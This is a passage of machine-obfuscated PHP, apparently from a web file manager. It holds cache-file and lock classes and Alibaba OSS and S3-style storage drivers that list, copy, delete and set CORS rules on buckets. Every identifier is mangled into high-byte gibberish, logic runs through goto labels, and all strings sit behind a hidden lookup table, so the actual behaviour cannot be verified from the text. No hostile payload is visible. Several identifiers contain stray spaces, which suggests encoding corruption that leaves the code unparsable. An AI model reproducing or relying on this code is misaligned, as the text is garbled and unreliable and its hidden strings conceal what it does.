$¾ü´å¦œ =& $_SERVER[„Ç©ñÎ©]; if (!defined($¾ü´å¦œ[484])) { define($¾ü´å¦œ[484], 0); } $õ’¾…şğ[$¾ü´å¦œ[1655]] = USER_ID; return $õ’¾…şğ; } public function cacheRemoveUser($±ŒÁ…±Ã, $à“ô…Ñ) { return Cache::remove("\x55\163\x65\x72\117\x70\164\151\157\156\x5f{$±ŒÁ…±Ã}\x5f" . $à“ô…Ñ); } protected function optionDefault($ä‘‘†—Ù = '') { $®ÈÖæ• =& $_SERVER[„Ç©ñÎ©]; if ($ä‘‘†—Ù == $®ÈÖæ•[12]) { return $GLOBALS[$®ÈÖæ•[6]][$®ÈÖæ•[2314]]; } if ($ä‘‘†—Ù == $®ÈÖæ•[2315]) { return $GLOBALS[$®ÈÖæ•[6]][$®ÈÖæ•[2316]]; } } } goto cÛƒ×ÕÙ; E¬‚ƒ¬ºŠ‹: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($†’úş¾Ÿ, $’ŞÑ¿ç¹) { $ã›ûÌ =& $_SERVER[„Ç©ñÎ©]; $this->cachePath = $†’úş¾Ÿ[$ã›ûÌ[94]]; $this->prefix = $ã›ûÌ[837]; $this->cacheTime = $’ŞÑ¿ç¹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Š¬«ê…) { $ß·ÎÖÆ¥ =& $_SERVER[„Ç©ñÎ©]; $Š¬«ê… = str_replace(array($ß·ÎÖÆ¥[838], $ß·ÎÖÆ¥[107], $ß·ÎÖÆ¥[83]), $ß·ÎÖÆ¥[839], $Š¬«ê…); return $this->cachePath . $ß·ÎÖÆ¥[840] . $Š¬«ê… . $ß·ÎÖÆ¥[841]; } public function set($·¢çÎ“‚, $ÕßëÏĞû, $´É¼°¼¿ = false) { $á³ÍÉ®“ = $this->getFile($·¢çÎ“‚); if (file_put_contents($á³ÍÉ®“, $this->prefix . $ÕßëÏĞû, LOCK_EX)) { @touch($á³ÍÉ®“, intval(time() + $´É¼°¼¿)); clearstatcache(); return !0; } @unlink($á³ÍÉ®“); return !1; } public function get($òûë¢â¶) { $ë•µ»í = $this->getFile($òûë¢â¶); if (file_exists($ë•µ»í) && filemtime($ë•µ»í) < time()) { @unlink($ë•µ»í); return !1; } $şíÉ†Âø = @file_get_contents($ë•µ»í); return substr($şíÉ†Âø, strlen($this->prefix)); } public function remove($ö“ÒÈÄª) { $ÏÉÆŒ„Ü = $this->getFile($ö“ÒÈÄª); return @unlink($ÏÉÆŒ„Ü); } public function deleteAll() { $»çÜ¤×‰ =& $_SERVER[„Ç©ñÎ©]; $¨€´ıïĞ = scandir($this->cachePath); foreach ($¨€´ıïĞ as $í¶•Û­È) { $áö¥‘´ş = $this->cachePath . $í¶•Û­È; if (strpos($áö¥‘´ş, $»çÜ¤×‰[841]) && strpos($áö¥‘´ş, $»çÜ¤×‰[842])) { @unlink($áö¥‘´ş); } } } public function clearTimeout() { $Öáº’£Š =& $_SERVER[„Ç©ñÎ©]; $ó°ö™ î = scandir($this->cachePath); foreach ($ó°ö™ î as $ÃíÇü¶ì) { $’£ÉÊ­Ã = $this->cachePath . $ÃíÇü¶ì; if (strpos($’£ÉÊ­Ã, $Öáº’£Š[841]) && strpos($’£ÉÊ­Ã, $Öáº’£Š[842]) && filemtime($’£ÉÊ­Ã) < time()) { @unlink($’£ÉÊ­Ã); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ıÇúÔ‹ =& $_SERVER[„Ç©ñÎ©]; if (self::$handle) { return self::$handle; } $ò‡‹ß¡± = $GLOBALS[$ıÇúÔ‹[6]][$ıÇúÔ‹[358]]; self::$timeout = $ò‡‹ß¡±[$ıÇúÔ‹[843]] ? $ò‡‹ß¡±[$ıÇúÔ‹[843]] : 10; $ô¡†·è = _get($GLOBALS[$ıÇúÔ‹[6]], $ıÇúÔ‹[844]); $•­ø¸¨· = $ò‡‹ß¡±[$ıÇúÔ‹[830]] ? $ò‡‹ß¡±[$ıÇúÔ‹[830]] : $ıÇúÔ‹[209]; if ($•­ø¸¨· == $ıÇúÔ‹[21] && $ô¡†·è == $ıÇúÔ‹[13]) { $•­ø¸¨· = $ıÇúÔ‹[209]; } switch ($•­ø¸¨·) { case $ıÇúÔ‹[833]: self::$handle = new CacheLockRedis(); break; case $ıÇúÔ‹[834]: self::$handle = new CacheLockMemcached(); break; case $ıÇúÔ‹[21]: self::$handle = new CacheLockDatabase(); break; case $ıÇúÔ‹[209]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ıÇúÔ‹[845], $ıÇúÔ‹[846]); } return self::$handle; } private static function key($„‹ğ¥Ñë) { return $_SERVER[„Ç©ñÎ©][847] . Cache::key($„‹ğ¥Ñë); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ã”õÏìß = '') { self::$errorMsg = $ã”õÏìß; } public static function lockGlobal($ş –ä´, $éâ¨¾£´) { return self::lock($ş –ä´, $éâ¨¾£´, !0); } public static function lock($ƒ¯ŞÇÇæ, $šµüş©¶ = false, $ØáÒ‰ë½ = false) { $ŸÏ©·©ã =& $_SERVER[„Ç©ñÎ©]; $ùÚÊè™Ó = self::init(); $Ããƒ»Å = self::key($ƒ¯ŞÇÇæ); $šµüş©¶ = $šµüş©¶ ? $šµüş©¶ : self::$timeout; $ıŒ¡ÎŞ« = $ùÚÊè™Ó->lock($Ããƒ»Å, $šµüş©¶); $Ò÷ûÇÜ = timeFloat(); if (!$ıŒ¡ÎŞ«) { $ÀÜ¨–‘‘ = "\x6c\x6f\x63\x6b\40\145\x72\162\x6f\162\73\x6b\x65\x79\75{$ƒ¯ŞÇÇæ}\x3b\x74\151\x6d\x65\75{$šµüş©¶}\73" . self::$errorMsg . $ŸÏ©·©ã[81] . get_caller_msg(); $­†½†² = LNG($ŸÏ©·©ã[848]) . "\x28{$šµüş©¶}\x73\x29\x2e" . LNG($ŸÏ©·©ã[849]); $­†½†² .= $ŸÏ©·©ã[850]; if (is_string(self::$errorMsg) && self::$errorMsg) { $­†½†² = $­†½†² . $ŸÏ©·©ã[851] . self::$errorMsg; } write_log($ÀÜ¨–‘‘, $ŸÏ©·©ã[846]); show_json($­†½†², !1); } if (!$ØáÒ‰ë½) { self::$lockItem[$Ããƒ»Å] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ı‹§ü•¤ = number_format(timeFloat() - $Ò÷ûÇÜ, 3); write_log($ŸÏ©·©ã[852] . $ƒ¯ŞÇÇæ . $ŸÏ©·©ã[853] . $ı‹§ü•¤, $ŸÏ©·©ã[846]); } return $ıŒ¡ÎŞ«; } public static function lockGet($ğ—°³Ñ) { $ø¦ï˜Çï = self::key($ğ—°³Ñ); if (self::$lockItem[$ø¦ï˜Çï]) { return self::$lockItem[$ø¦ï˜Çï]; } return self::init()->lockGet($ø¦ï˜Çï); } public static function unlock($Èâ‘›™ ) { $Öç¹ÏÇß =& $_SERVER[„Ç©ñÎ©]; $¹İæ‹ = self::key($Èâ‘›™ ); self::$lockItem[$¹İæ‹] = null; self::init()->unlock($¹İæ‹); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Öç¹ÏÇß[854] . $Èâ‘›™ , $Öç¹ÏÇß[846]); } return; } public static function unlockRuntime() { $Üêê™È÷ =& $_SERVER[„Ç©ñÎ©]; $¨ÚŞ ë = self::init(); $ØŞâ°ú… = !1; foreach (self::$lockItem as $‚ãÜ‘Á„ => $¶œìÙ…Å) { if (!$¶œìÙ…Å) { continue; } $¨ÚŞ ë->unlock($‚ãÜ‘Á„); if (!$ØŞâ°ú…) { $ØŞâ°ú… = !0; write_log($Üêê™È÷[855] . $‚ãÜ‘Á„ . $Üêê™È÷[81] . get_caller_msg(), $Üêê™È÷[846]); continue; } write_log($Üêê™È÷[855] . $‚ãÜ‘Á„, $Üêê™È÷[846]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÃŸÒ¥Ø› = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Üêê™È÷[856] . $ÃŸÒ¥Ø› . $Üêê™È÷[857] . ACTION, $Üêê™È÷[846]); } } public static function fileLock($Í¹†Õ°) { $ÈîÏè¼‰ =& $_SERVER[„Ç©ñÎ©]; if (!$GLOBALS[$ÈîÏè¼‰[858]]) { $GLOBALS[$ÈîÏè¼‰[858]] = array(); } $GLOBALS[$ÈîÏè¼‰[858]][$Í¹†Õ°] = !1; $Äñœ‘¨Ö = fopen(DATA_PATH . $Í¹†Õ° . $ÈîÏè¼‰[859], $ÈîÏè¼‰[860]); if (!$Äñœ‘¨Ö) { return !1; } $GLOBALS[$ÈîÏè¼‰[858]][$Í¹†Õ°] = $Äñœ‘¨Ö; if (flock($Äñœ‘¨Ö, LOCK_EX)) { return !0; } self::unlock($Í¹†Õ°); show_json($ÈîÏè¼‰[861], !1); return !1; } public static function fileUnlock($ÂÂ…Ù¥) { $‚Õ«ÄØÒ =& $_SERVER[„Ç©ñÎ©]; $°¡¾îÂÕ = $GLOBALS[$‚Õ«ÄØÒ[858]][$ÂÂ…Ù¥]; if (!$°¡¾îÂÕ) { return; } $GLOBALS[$‚Õ«ÄØÒ[858]][$ÂÂ…Ù¥] = !1; flock($°¡¾îÂÕ, LOCK_UN); fclose($°¡¾îÂÕ); } public static function fileUnlockAll() { $åè€š®ß =& $_SERVER[„Ç©ñÎ©]; if (!$GLOBALS[$åè€š®ß[858]]) { return; } foreach ($GLOBALS[$åè€š®ß[858]] as $é¬ÃÇ¼‡ => $ºÓã“¥Ù) { if (!$ºÓã“¥Ù) { continue; } $GLOBALS[$åè€š®ß[858]][$é¬ÃÇ¼‡] = !1; flock($ºÓã“¥Ù, LOCK_UN); fclose($ºÓã“¥Ù); } $GLOBALS[$åè€š®ß[858]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto a—ÉÛô¾Æ; Cİ™¢òøéÙ: define($_SERVER[„Ç©ñÎ©][250], 1); define($_SERVER[„Ç©ñÎ©][251], 0); define($_SERVER[„Ç©ñÎ©][252], 2); goto c—¥¶“ÂæÆ; b˜Ä÷‹¬À¥: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ñà¡›ó‰) { parent::__construct($ñà¡›ó‰); $this->signatureVersion($_SERVER[„Ç©ñÎ©][226]); } public function fileOutLink($ûÉÉ»Ì) { $şÛşÙ¨ğ =& $_SERVER[„Ç©ñÎ©]; if (substr($ûÉÉ»Ì, 0, 7) == $şÛşÙ¨ğ[1324]) { $ûÉÉ»Ì = $şÛşÙ¨ğ[1325] . substr($ûÉÉ»Ì, 7); } header($şÛşÙ¨ğ[171] . $ûÉÉ»Ì); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($¶Ú“Æà“) { parent::__construct(); include_once SDK_DIR . $_SERVER[„Ç©ñÎ©][1381]; $this->_init($¶Ú“Æà“); } public function _init($²²Œ´Âù) { $×û–™Ò­ =& $_SERVER[„Ç©ñÎ©]; foreach ($²²Œ´Âù as $ÀÚ­Ú€Ë => $”éÂİï«) { if (isset($this->{$ÀÚ­Ú€Ë})) { $this->{$ÀÚ­Ú€Ë} = $”éÂİï«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($×û–™Ò­[1382] . LNG($×û–™Ò­[1383])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ôİû¦•î =& $_SERVER[„Ç©ñÎ©]; $€å‹–ìì = new OSS\Model\CorsConfig(); $ÚúßÊãŞ = new OSS\Model\CorsRule(); $ÚúßÊãŞ->addAllowedOrigin($ôİû¦•î[1384]); $ÚúßÊãŞ->addAllowedMethod($ôİû¦•î[1385]); $ÚúßÊãŞ->addAllowedMethod($ôİû¦•î[1386]); $ÚúßÊãŞ->addAllowedMethod($ôİû¦•î[1387]); $ÚúßÊãŞ->addAllowedMethod($ôİû¦•î[1388]); $ÚúßÊãŞ->addAllowedMethod($ôİû¦•î[170]); $ÚúßÊãŞ->setMaxAgeSeconds(600); $ÚúßÊãŞ->addExposeHeader($ôİû¦•î[1389]); $ÚúßÊãŞ->addAllowedHeader($ôİû¦•î[1384]); $€å‹–ìì->addRule($ÚúßÊãŞ); try { $this->client->putBucketCors($this->bucket, $€å‹–ìì); } catch (OSS\Core\OssException $Ö§¥Üà¹) { return !1; } return !0; } public function getBucketCors() { $üÌä’æ =& $_SERVER[„Ç©ñÎ©]; $ñ‚ÖÀâ“ = null; try { $ñ‚ÖÀâ“ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $šùª²£À) { return null; } if (!$ñ‚ÖÀâ“ || !($¯é–¯ªÂ = $ñ‚ÖÀâ“->getRules())) { return null; } $áËÃ»Ğ… = $¯é–¯ªÂ[0]->getAllowedOrigins(); $ÄØÊˆ°Ú = $¯é–¯ªÂ[0]->getAllowedMethods(); $İ°Ñ¤ÏŠ = $¯é–¯ªÂ[0]->getMaxAgeSeconds(); $Ãİ·ıÎ­ = $¯é–¯ªÂ[0]->getExposeHeaders(); $éÖ¿¤Ğ‹ = $¯é–¯ªÂ[0]->getAllowedHeaders(); return array($üÌä’æ[197] => isset($áËÃ»Ğ…[0]) ? $áËÃ»Ğ…[0] : $üÌä’æ[12], $üÌä’æ[201] => $ÄØÊˆ°Ú, $üÌä’æ[1390] => $İ°Ñ¤ÏŠ, $üÌä’æ[1391] => isset($Ãİ·ıÎ­[0]) ? $Ãİ·ıÎ­[0] : $üÌä’æ[12], $üÌä’æ[199] => isset($éÖ¿¤Ğ‹[0]) ? $éÖ¿¤Ğ‹[0] : $üÌä’æ[12]); } public function isBucketCors() { $ëˆìüÍ =& $_SERVER[„Ç©ñÎ©]; $ıø†È¥î = $this->getBucketCors(); if (!$ıø†È¥î || !is_array($ıø†È¥î)) { return !1; } if ($ıø†È¥î[$ëˆìüÍ[197]] != $ëˆìüÍ[198] || $ıø†È¥î[$ëˆìüÍ[199]] != $ëˆìüÍ[198]) { return !1; } $¦üˆå½¹ = array_map($ëˆìüÍ[200], $ıø†È¥î[$ëˆìüÍ[201]]); if (!is_array($¦üˆå½¹)) { $¦üˆå½¹ = array(); } $ŞŞë¯É = array($ëˆìüÍ[202], $ëˆìüÍ[203], $ëˆìüÍ[204], $ëˆìüÍ[205], $ëˆìüÍ[206]); $ÛÓŒ›Ä² = array_diff($ŞŞë¯É, $¦üˆå½¹); return empty($ÛÓŒ›Ä²); } public function mkfile($ ‰±–›÷, $ İ¼ìöã = '', $è•òÄüÂ = REPEAT_RENAME) { $ó£Ôëæ = $this->setContent($ ‰±–›÷, $ İ¼ìöã); if ($ó£Ôëæ !== !1) { return $this->getPathOuter($ ‰±–›÷); } return !1; } public function mkdir($ûŒ¼çƒ, $ÖŸŞÎÈ = REPEAT_SKIP) { if ($ÖŸŞÎÈ && $this->_isFolder($ûŒ¼çƒ)) { return $this->getPathOuter($ûŒ¼çƒ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ûŒ¼çƒ)); } catch (OSS\Core\OssException $Ø­á‰®) { return !1; } return $this->getPathOuter($ûŒ¼çƒ); } private function fileList($ê­Ã´, $Ùİ°½½ì = '', $³¼×¯‹ = 0) { $˜ßéŒ‚Ÿ =& $_SERVER[„Ç©ñÎ©]; $ê­Ã´ = trim($ê­Ã´, $˜ßéŒ‚Ÿ[8]); $Ã†®íÀ = empty($ê­Ã´) && $ê­Ã´ !== $˜ßéŒ‚Ÿ[207] ? $˜ßéŒ‚Ÿ[12] : $ê­Ã´ . $˜ßéŒ‚Ÿ[8]; $ƒÊş—Â = $˜ßéŒ‚Ÿ[12]; $äÉ¥Ñğã = 1000; $‹Ù†¢Å— = $ôŒâ– = array(); while (!0) { check_abort(); $ùÜô·±¢ = array($˜ßéŒ‚Ÿ[1392] => $Ùİ°½½ì, $˜ßéŒ‚Ÿ[1393] => $Ã†®íÀ, $˜ßéŒ‚Ÿ[1394] => $äÉ¥Ñğã, $˜ßéŒ‚Ÿ[1395] => $ƒÊş—Â); try { $ŸÄ³ö = $this->client->listObjects($this->bucket, $ùÜô·±¢); } catch (OSS\Core\OssException $šŠãÁİ) { break; } $ƒÊş—Â = $ŸÄ³ö->getNextMarker(); $û‹è»ğŞ = $ŸÄ³ö->getObjectList(); $¨¸õîØ = $ŸÄ³ö->getPrefixList(); foreach ($û‹è»ğŞ as $û§ÈÜ’) { if ($û§ÈÜ’->getKey() == $Ã†®íÀ) { continue; } $“×¿˜„Ø = $û§ÈÜ’->getKey(); $Æ§‰é®á = $û§ÈÜ’->getSize(); $ØÀš­¡¾ = $û§ÈÜ’->getLastModified(); $†æ×ÁõÑ = $³¼×¯‹ ? array($˜ßéŒ‚Ÿ[32] => $“×¿˜„Ø, $˜ßéŒ‚Ÿ[86] => $Æ§‰é®á, $˜ßéŒ‚Ÿ[213] => strtotime($ØÀš­¡¾)) : $“×¿˜„Ø; $îÖãŒè­ = $Æ§‰é®á == 0 && substr($“×¿˜„Ø, strlen($“×¿˜„Ø) - 1, 1) == $˜ßéŒ‚Ÿ[8] ? !0 : !1; $´Ñæš = array($˜ßéŒ‚Ÿ[86] => $Æ§‰é®á, $˜ßéŒ‚Ÿ[1396] => $Æ§‰é®á, $˜ßéŒ‚Ÿ[95] => strtotime($ØÀš­¡¾), $˜ßéŒ‚Ÿ[1397] => $ØÀš­¡¾); $this->cacheMethodInfoSet($“×¿˜„Ø, $îÖãŒè­, $´Ñæš); if ($îÖãŒè­) { $‹Ù†¢Å—[] = $“×¿˜„Ø; continue; } $ôŒâ–[] = $†æ×ÁõÑ; } foreach ($¨¸õîØ as $í‘î¶é) { $‹Ù†¢Å—[] = $í‘î¶é->getPrefix(); $this->cacheMethodInfoSet($í‘î¶é->getPrefix(), !0); } if ($ƒÊş—Â === $˜ßéŒ‚Ÿ[12]) { break; } } $this->cacheMethodInfoSet($ê­Ã´, !0); return array($˜ßéŒ‚Ÿ[92] => $‹Ù†¢Å—, $˜ßéŒ‚Ÿ[93] => $ôŒâ–); } public function copyFile($´Å¾·…Î, $œªùÓËõ) { $ÍÁ·¼¬ = $this->size($´Å¾·…Î); if ($ÍÁ·¼¬ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $´Å¾·…Î, $this->bucket, $this->pathEncode($œªùÓËõ)); } catch (OSS\Core\OssException $©ñÚ°Ö) { return !1; } return $this->getPathOuter($œªùÓËõ); } $ÜÍò×‘ = $this->multiCopyObject($´Å¾·…Î, $œªùÓËõ, $ÍÁ·¼¬); return $ÜÍò×‘ ? $this->getPathOuter($œªùÓËõ) : !1; } private function multiCopyObject($±†œ«¾, $Ù…½´‰×, $¼ş„²ø´) { $Œ³Ÿ•Ë£ =& $_SERVER[„Ç©ñÎ©]; try { $°•É£³õ = array(); if ($ä£ı¶ËÔ = $this->hashMd5($±†œ«¾)) { $°•É£³õ = array(OSS\OssClient::OSS_HEADERS => array($Œ³Ÿ•Ë£[1398] => $ä£ı¶ËÔ)); } $ü²áé¼ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ù…½´‰×), $°•É£³õ); $ÙáÜçŞÆ = 1; $ØòÑ•û² = 0; $«Ü¿ØÒØ = array(); $¿¸‰—¸• = 1024 * 1024 * 10; $ ŸŞêÀ¹ = $this->client->generateMultiuploadParts($¼ş„²ø´, $¿¸‰—¸•); foreach ($ ŸŞêÀ¹ as $¿ÄÄ»²° => $¿¯•û¢‡) { $£Ô‡ÉÜ” = $ØòÑ•û² + (int) $¿¯•û¢‡[$Œ³Ÿ•Ë£[1399]]; $ˆ¢ãõàŠ = (int) $¿¯•û¢‡[$Œ³Ÿ•Ë£[346]] + $£Ô‡ÉÜ” - 1; $ÎşæÉŸŒ = array($Œ³Ÿ•Ë£[1400] => $£Ô‡ÉÜ”, $Œ³Ÿ•Ë£[1401] => $ˆ¢ãõàŠ); $«Ü¿ØÒØ[] = $this->client->uploadPartCopy($this->bucket, $±†œ«¾, $this->bucket, $this->pathEncode($Ù…½´‰×), $ÙáÜçŞÆ, $ü²áé¼, $ÎşæÉŸŒ); $ÙáÜçŞÆ = $ÙáÜçŞÆ + 1; } $ ‚ó¦ = array(); foreach ($«Ü¿ØÒØ as $¿ÄÄ»²° => $µ¦¢‚Ï”) { $ ‚ó¦[] = array($Œ³Ÿ•Ë£[1402] => $¿ÄÄ»²° + 1, $Œ³Ÿ•Ë£[1403] => $µ¦¢‚Ï”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ù…½´‰×), $ü²áé¼, $ ‚ó¦); } catch (OSS\Core\OssException $”è¾œ­À) { return !1; } return !0; } public function moveFile($­É´Ş×Ë, $¬ÁÍ‹¬¿) { if ($this->copyFile($­É´Ş×Ë, $¬ÁÍ‹¬¿)) { $this->remove($­É´Ş×Ë); return $this->getPathOuter($¬ÁÍ‹¬¿); } return !1; } public function delFile($Ôë”«×ƒ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ôë”«×ƒ)); } catch (OSS\Core\OssException $¾‰£æÕ÷) { return !1; } return !0; } public function delFolder($ú‚­´ı¨) { $œá§‡ÍÔ =& $_SERVER[„Ç©ñÎ©]; if (!$this->exist($ú‚­´ı¨)) { return !0; } $this->listItemCache = !1; $±åÖ“‡œ = $this->fileList($ú‚­´ı¨); $this->listItemCache = !0; $®ƒ¯Øö¿ = trim($ú‚­´ı¨, $œá§‡ÍÔ[8]) . $œá§‡ÍÔ[8]; if (!empty($ú‚­´ı¨) && $ú‚­´ı¨ !== $œá§‡ÍÔ[207] && !in_array($®ƒ¯Øö¿, $±åÖ“‡œ[$œá§‡ÍÔ[92]])) { $±åÖ“‡œ[$œá§‡ÍÔ[92]][] = $®ƒ¯Øö¿; } $ƒÍÔšêÅ = $this->delByBatch($±åÖ“‡œ[$œá§‡ÍÔ[93]]); if (!$ƒÍÔšêÅ) { return !1; } $ƒÍÔšêÅ = $this->delByBatch($±åÖ“‡œ[$œá§‡ÍÔ[92]]); if (!$ƒÍÔšêÅ) { return !1; } return $this->delFile($®ƒ¯Øö¿); } private function delByBatch($È½¼£éÆ) { foreach (array_chunk($È½¼£éÆ, 1000) as $º˜ØğĞ‚) { try { $this->client->deleteObjects($this->bucket, $º˜ØğĞ‚); } catch (OSS\Core\OssException $ƒ××İ÷£) { return !1; } } return !0; } public function rename($Ôî¯ˆÁ×, $àÑ¹½‡) { return $this->renameObject($Ôî¯ˆÁ×, $àÑ¹½‡); } private function fileInfo($øŸš‹, $õ­€ò€É = false, $İöŞƒ•ˆ = array()) { $¯ÍË¬™ =& $_SERVER[„Ç©ñÎ©]; $Öïêİ…Í = array($¯ÍË¬™[32] => $this->pathThis($øŸš‹), $¯ÍË¬™[94] => $this->getPathOuter($øŸš‹), $¯ÍË¬™[33] => $¯ÍË¬™[209], $¯ÍË¬™[86] => isset($İöŞƒ•ˆ[$¯ÍË¬™[86]]) ? $İöŞƒ•ˆ[$¯ÍË¬™[86]] : 0, $¯ÍË¬™[184] => $this->ext($øŸš‹)); if ($õ­€ò€É) { return $Öïêİ…Í; } $Öïêİ…Í[$¯ÍË¬™[210]] = $Öïêİ…Í[$¯ÍË¬™[95]] = 0; $Öïêİ…Í[$¯ÍË¬™[211]] = $Öïêİ…Í[$¯ÍË¬™[212]] = !0; if (empty($İöŞƒ•ˆ)) { $®ù›ÖÀó = $this->objectMeta($øŸš‹); if (!$®ù›ÖÀó) { return $Öïêİ…Í; } $İöŞƒ•ˆ = array($¯ÍË¬™[95] => strtotime($®ù›ÖÀó[$¯ÍË¬™[1397]]), $¯ÍË¬™[86] => $®ù›ÖÀó[$¯ÍË¬™[1396]] + 0); } if (isset($İöŞƒ•ˆ[$¯ÍË¬™[86]])) { $Öïêİ…Í[$¯ÍË¬™[86]] = $İöŞƒ•ˆ[$¯ÍË¬™[86]]; } if (isset($İöŞƒ•ˆ[$¯ÍË¬™[95]])) { $Öïêİ…Í[$¯ÍË¬™[95]] = $İöŞƒ•ˆ[$¯ÍË¬™[95]]; } if (isset($İöŞƒ•ˆ[$¯ÍË¬™[213]]) && !trim($Öïêİ…Í[$¯ÍË¬™[95]])) { $Öïêİ…Í[$¯ÍË¬™[95]] = $İöŞƒ•ˆ[$¯ÍË¬™[213]]; } return $Öïêİ…Í; } private function folderInfo($’éÙå·Š, $°™Ãˆ¸ = false, $ûÄƒœ÷ = array()) { $®Ìôº¡ =& $_SERVER[„Ç©ñÎ©]; $õá©ÃÉ = array($®Ìôº¡[32] => $this->pathThis($’éÙå·Š), $®Ìôº¡[94] => $this->getPathOuter($®Ìôº¡[8] . $’éÙå·Š), $®Ìôº¡[33] => $®Ìôº¡[85]); if ($°™Ãˆ¸) { return $õá©ÃÉ; } $õá©ÃÉ[$®Ìôº¡[210]] = $õá©ÃÉ[$®Ìôº¡[95]] = 0; $õá©ÃÉ[$®Ìôº¡[211]] = $õá©ÃÉ[$®Ìôº¡[212]] = !0; if (empty($ûÄƒœ÷)) { $’éÙå·Š = rtrim($’éÙå·Š, $®Ìôº¡[8]) . $®Ìôº¡[8]; $£ñ»ÄõÉ = $this->objectMeta($’éÙå·Š); if (!$£ñ»ÄõÉ) { return $õá©ÃÉ; } $ûÄƒœ÷ = array($®Ìôº¡[210] => $£ñ»ÄõÉ[$®Ìôº¡[520]][$®Ìôº¡[1404]], $®Ìôº¡[95] => strtotime($£ñ»ÄõÉ[$®Ìôº¡[1397]])); } if (isset($ûÄƒœ÷[$®Ìôº¡[95]])) { $õá©ÃÉ[$®Ìôº¡[95]] = $ûÄƒœ÷[$®Ìôº¡[95]]; } if (isset($ûÄƒœ÷[$®Ìôº¡[210]])) { $õá©ÃÉ[$®Ìôº¡[210]] = $ûÄƒœ÷[$®Ìôº¡[210]]; } return $õá©ÃÉ; } public function listPath($ôÃÒ÷ÏŠ, $ãÕ©ĞÍµ = false) { $¯êÒÄÈ =& $_SERVER[„Ç©ñÎ©]; $£âÉ¾Ğ = $this->fileList($ôÃÒ÷ÏŠ, $¯êÒÄÈ[8], !0); foreach ($£âÉ¾Ğ[$¯êÒÄÈ[92]] as $”Ê‘„ÉÎ => $Ç’•ù˜Ç) { $£âÉ¾Ğ[$¯êÒÄÈ[92]][$”Ê‘„ÉÎ] = $this->folderInfo($Ç’•ù˜Ç, $ãÕ©ĞÍµ, $Ç’•ù˜Ç); } foreach ($£âÉ¾Ğ[$¯êÒÄÈ[93]] as $”Ê‘„ÉÎ => $Ç’•ù˜Ç) { $£âÉ¾Ğ[$¯êÒÄÈ[93]][$”Ê‘„ÉÎ] = $this->fileInfo($Ç’•ù˜Ç[$¯êÒÄÈ[32]], $ãÕ©ĞÍµ, $Ç’•ù˜Ç); } return $£âÉ¾Ğ; } protected function infoChildren($ã›Ô «, &$—ëÇ¡Ï×) { $ëÅİç–· =& $_SERVER[„Ç©ñÎ©]; $ÍÒÑÏŸÚ = $this->fileList($ã›Ô «, $ëÅİç–·[12], !0); $—ëÇ¡Ï×[$ëÅİç–·[88]] += count($ÍÒÑÏŸÚ[$ëÅİç–·[92]]); $—ëÇ¡Ï×[$ëÅİç–·[87]] += count($ÍÒÑÏŸÚ[$ëÅİç–·[93]]); foreach ($ÍÒÑÏŸÚ[$ëÅİç–·[93]] as $çµê­œ°) { if (!$çµê­œ° || !$çµê­œ°[$ëÅİç–·[86]]) { continue; } $—ëÇ¡Ï×[$ëÅİç–·[86]] += $çµê­œ°[$ëÅİç–·[86]]; } } public function has($íğŸ˜¦Ø, $æÃšÒ“¤ = false, $³Éôèô¿ = true) { $æ¹ìĞ¹û =& $_SERVER[„Ç©ñÎ©]; $íğŸ˜¦Ø = trim($íğŸ˜¦Ø, $æ¹ìĞ¹û[8]); $Áäşìºå = empty($íğŸ˜¦Ø) && $íğŸ˜¦Ø !== $æ¹ìĞ¹û[207] ? $æ¹ìĞ¹û[12] : $íğŸ˜¦Ø . $æ¹ìĞ¹û[8]; $Ûş¨´õó = $æ¹ìĞ¹û[12]; $ãÈº÷ = 500; $ñïÊõÁç = $ÕÂºÊøÍ = 0; while (!0) { check_abort(); $ìáæ¥¥¬ = array($æ¹ìĞ¹û[1392] => $æ¹ìĞ¹û[8], $æ¹ìĞ¹û[1393] => $Áäşìºå, $æ¹ìĞ¹û[1394] => $ãÈº÷, $æ¹ìĞ¹û[1395] => $Ûş¨´õó); try { $ã™í½‡± = $this->client->listObjects($this->bucket, $ìáæ¥¥¬); } catch (OSS\Core\OssException $–ß‘´¼ª) { break; } $Ûş¨´õó = $ã™í½‡±->getNextMarker(); $Š—ñ¸ø = $ã™í½‡±->getObjectList(); $©·øó¡Ã = $ã™í½‡±->getPrefixList(); if ($æÃšÒ“¤) { if (count($Š—ñ¸ø) > 1 || count($Š—ñ¸ø) == 1 && $Š—ñ¸ø[0]->getKey() != $Áäşìºå) { $ñïÊõÁç += count($Š—ñ¸ø) - 1; } if (!empty($©·øó¡Ã)) { $ÕÂºÊøÍ += count($©·øó¡Ã); } if ($Ûş¨´õó === $æ¹ìĞ¹û[12]) { break; } continue; } if ($³Éôèô¿) { if (!empty($Š—ñ¸ø)) { if (count($Š—ñ¸ø) > 1 || $Š—ñ¸ø[0]->getKey() != $Áäşìºå) { return !0; } } } else { if (!empty($©·øó¡Ã)) { return !0; } } if ($Ûş¨´õó === $æ¹ìĞ¹û[12]) { break; } } if ($æÃšÒ“¤) { return array($æ¹ìĞ¹û[217] => 